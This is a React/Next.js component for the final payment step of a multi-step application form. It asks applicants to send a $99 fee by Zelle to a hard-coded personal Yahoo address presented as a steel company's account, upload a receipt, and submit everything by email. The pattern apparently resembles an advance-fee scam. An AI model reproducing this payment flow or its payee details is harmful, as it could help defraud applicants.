"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { useApplicationStore } from "@/lib/store"
import { Progress } from "@/components/ui/progress"
import { motion } from "framer-motion"
import { Loader2, CreditCard, Receipt, DollarSign } from "lucide-react"
import { Formik, Form, Field, ErrorMessage } from "formik"
import * as Yup from "yup"
import { getSettings } from "@/lib/settings"

const validationSchema = Yup.object().shape({
  paymentMethod: Yup.string()
    .required("Payment method is required"),
  paymentReceipt: Yup.mixed()
    .required("Payment receipt is required")
    .test("fileSize", "File size must be less than 5MB", (value) => {
      if (!value || !(value instanceof File)) return false;
      return value.size <= 5 * 1024 * 1024; // 5MB
    })
    .test("fileType", "Unsupported file type", (value) => {
      if (!value || !(value instanceof File)) return false;
      return ["application/pdf", "image/jpeg", "image/png"].includes(value.type);
    })
})

export default function Step5() {
  const router = useRouter()
  const { formData, setFormData, clearFormData } = useApplicationStore()
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [paymentInfo, setPaymentInfo] = useState({
    applicationFee: 99,
    refundAmount: 75,
    zelle: {
      email: "Guywell90@yahoo.com",
      name: "INDEPENDENT STEEL COMPANY, LLC (Our Parent Company)"
    },
    cashApp: {
      cashtag: "Coming soon"
    }
  })

  useEffect(() => {
    // Load settings using the new getSettings function
    const loadSettings = async () => {
      try {
        const settings = await getSettings()
        // Update payment info with the latest settings
        setPaymentInfo({
          applicationFee: settings.paymentInstructions.applicationFee || 99,
          refundAmount: settings.paymentInstructions.refundAmount || 75,
          zelle: {
            email: settings.zelleEmail || settings.paymentInstructions.zelle.email || "Guywell90@yahoo.com",
            name: settings.zelleName || settings.paymentInstructions.zelle.name || "INDEPENDENT STEEL COMPANY, LLC (Our Parent Company)"
          },
          cashApp: {
            cashtag: settings.cashAppTag || settings.paymentInstructions.cashApp.cashtag || "Coming soon"
          }
        })
      } catch (error) {
        console.error("Error loading settings:", error)
        // Fallback to default payment info if there's an error
        setPaymentInfo({
          applicationFee: 99,
          refundAmount: 75,
          zelle: {
            email: "Guywell90@yahoo.com",
            name: "INDEPENDENT STEEL COMPANY, LLC (Our Parent Company)"
          },
          cashApp: {
            cashtag: "Coming soon"
          }
        })
      }
    }

    loadSettings()
  }, [])

  const handleSubmit = async (values: any, { resetForm }: { resetForm: () => void }) => {
    setIsSubmitting(true)
    try {
      console.log('Starting form submission...')
      
      // Convert file to base64
      const file = values.paymentReceipt;
      console.log('Processing payment receipt:', file?.name)
      
      const reader = new FileReader();
      
      const fileData = await new Promise((resolve, reject) => {
        reader.onload = (e) => {
          const base64Content = e.target?.result as string;
          resolve({
            name: file.name,
            type: file.type,
            content: base64Content.split(',')[1] // Remove the data URL prefix
          });
        };
        reader.onerror = reject;
        reader.readAsDataURL(file);
      });
      console.log('Payment receipt processed successfully')

      // Update store with final step data including payment method and receipt
      const finalFormData = {
        ...formData,
        ...values,
        paymentMethod: values.paymentMethod,
        paymentReceipt: fileData
      }
      console.log('Final form data prepared:', { ...finalFormData, paymentReceipt: 'BASE64_DATA' })
      
      // Send email with all form data
      console.log('Sending email...')
      const response = await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(finalFormData),
      })

      const data = await response.json()
      console.log('Email response:', data)

      if (!response.ok) {
        throw new Error(data.error || 'Failed to send email')
      }

      if (!data.success) {
        throw new Error(data.message || 'Failed to send email')
      }

      // Clear all form data from store
      clearFormData()
      console.log('Form data cleared from store')
      
      // Reset form fields
      resetForm()
      console.log('Form fields reset')

      // Navigate to confirmation page
      router.push("/apply/confirmation")
      console.log('Redirected to confirmation page')
    } catch (error) {
      console.error("Error submitting form:", error)
      alert(error instanceof Error ? error.message : 'Failed to submit application. Please try again.')
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
    >
      <div className="max-w-2xl mx-auto px-4">
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-slate-900 mb-2">Payment</h1>
          <p className="text-slate-600">Step 5 of 5</p>
          <Progress value={100} className="mt-4" />
        </div>

        <Formik
          initialValues={{
            paymentMethod: formData.paymentMethod || "",
            paymentReceipt: null
          }}
          validationSchema={validationSchema}
          onSubmit={handleSubmit}
          enableReinitialize={false}
        >
          {({ errors, touched, setFieldValue, values }) => (
            <Form className="space-y-8">
              <Card className="shadow-sm border border-slate-200">
                <CardHeader className="bg-white border-b border-slate-200">
                  <CardTitle className="text-xl text-slate-900">Payment Information</CardTitle>
                  <CardDescription className="text-slate-600">
                    Complete your application payment
                  </CardDescription>
                </CardHeader>

                <CardContent className="p-6 space-y-8">
                  <div className="space-y-6">
                    {/* Application Fee Section */}
                    <div className="space-y-2">
                      <div className="flex items-center justify-between p-4 bg-slate-50 rounded-lg border border-slate-200">
                        <div className="flex items-center gap-2">
                          <DollarSign className="h-5 w-5 text-slate-700" />
                          <span className="text-slate-700 font-medium">Application Fee</span>
                        </div>
                        <span className="text-lg font-semibold text-slate-900">${paymentInfo.applicationFee}</span>
                      </div>
                      <div className="bg-blue-50 p-4 rounded-lg border border-blue-200">
                        <p className="text-sm text-blue-700">
                          If your application is denied, a refund of ${paymentInfo.refundAmount} will be issued to you via the same payment method you used.
                        </p>
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="paymentMethod" className="text-slate-700 flex items-center gap-2">
                        <CreditCard className="h-4 w-4" />
                        Payment Method *
                      </Label>
                      <RadioGroup
                        value={values.paymentMethod}
                        onValueChange={(value) => setFieldValue("paymentMethod", value)}
                        className="space-y-2"
                      >
                        <div className="flex items-center space-x-2">
                          <RadioGroupItem value="zelle" id="paymentMethod-zelle" />
                          <Label htmlFor="paymentMethod-zelle" className="text-slate-700">Zelle</Label>
                        </div>
                        <div className="flex items-center space-x-2">
                          <RadioGroupItem value="cash_app" id="paymentMethod-cashapp" />
                          <Label htmlFor="paymentMethod-cashapp" className="text-slate-700">Cash App</Label>
                        </div>
                      </RadioGroup>
                      <ErrorMessage
                        name="paymentMethod"
                        component="p"
                        className="text-sm text-red-500"
                      />
                      {values.paymentMethod && (
                        <div className="mt-4 p-4 bg-slate-50 rounded-lg border border-slate-200">
                          <p className="text-sm text-slate-700 font-medium mb-2">Payment Instructions:</p>
                          {values.paymentMethod === "zelle" ? (
                            <div className="space-y-1">
                              <p className="text-sm text-slate-600">Please send your payment to:</p>
                              <p className="text-sm text-slate-700">Email: {paymentInfo.zelle.email}</p>
                              <p className="text-sm text-slate-700">Name: {paymentInfo.zelle.name}</p>
                            </div>
                          ) : (
                            <div className="space-y-1">
                              <p className="text-sm text-slate-600">Please send your payment to:</p>
                              <p className="text-sm text-slate-700">{paymentInfo.cashApp.cashtag}</p>
                            </div>
                          )}
                        </div>
                      )}
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="paymentReceipt" className="text-slate-700 flex items-center gap-2">
                        <Receipt className="h-4 w-4" />
                        Payment Receipt *
                      </Label>
                      <div className="mt-2">
                        <Input
                          id="paymentReceipt"
                          type="file"
                          accept=".pdf,.jpg,.jpeg,.png"
                          onChange={(event) => {
                            const file = event.currentTarget.files?.[0]
                            if (file) {
                              setFieldValue("paymentReceipt", file)
                            }
                          }}
                          className={`border-slate-200 focus:border-slate-400 focus:ring-slate-400 ${
                            errors.paymentReceipt && touched.paymentReceipt ? "border-red-500 focus:border-red-500 focus:ring-red-500" : ""
                          }`}
                        />
                        <p className="text-sm text-slate-500 mt-1">
                          Accepted formats: PDF, JPG, PNG (max 5MB)
                        </p>
                        {errors.paymentReceipt && touched.paymentReceipt && (
                          <p className="text-sm text-red-500 mt-1">{errors.paymentReceipt}</p>
                        )}
                      </div>
                    </div>
                  </div>
                </CardContent>
                <div className="p-6 border-t border-slate-200">
                  <div className="flex justify-between">
                    <Button
                      type="button"
                      variant="outline"
                      onClick={() => router.push("/apply/step4")}
                      className="border-slate-200 text-slate-700 hover:bg-slate-50"
                    >
                      Back
                    </Button>
                    <Button
                      type="submit"
                      className="bg-slate-900 hover:bg-slate-800 text-white min-w-[120px]"
                      disabled={isSubmitting}
                    >
                      {isSubmitting ? (
                        <>
                          <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                          Submitting...
                        </>
                      ) : (
                        "Submit Application"
                      )}
                    </Button>
                  </div>
                </div>
              </Card>
            </Form>
          )}
        </Formik>
      </div>
    </motion.div>
  )
} 